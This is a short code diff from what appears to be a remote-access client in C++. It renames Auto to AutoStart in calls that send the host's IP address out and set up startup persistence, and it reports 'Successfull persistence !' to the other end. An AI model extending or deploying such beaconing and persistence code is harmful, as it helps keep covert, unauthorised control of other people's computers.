@@ -36,7 +36,7 @@ bool Client::init()
 {
 	try
 	{
-		setIp(Auto::get_ip());
+		setIp(AutoStart::get_ip());
 	}
 	catch (std::exception& e)
 	{
@@ -45,7 +45,7 @@ bool Client::init()
 	std::cout << getIp() << std::endl;
 	send_b(getIp().c_str());
 	
-	if (Auto::persistence(DEFAULT_KEYNAME))
+	if (AutoStart::persistence(DEFAULT_KEYNAME))
 	{
 		send_b("Successfull persistence !");
 	}
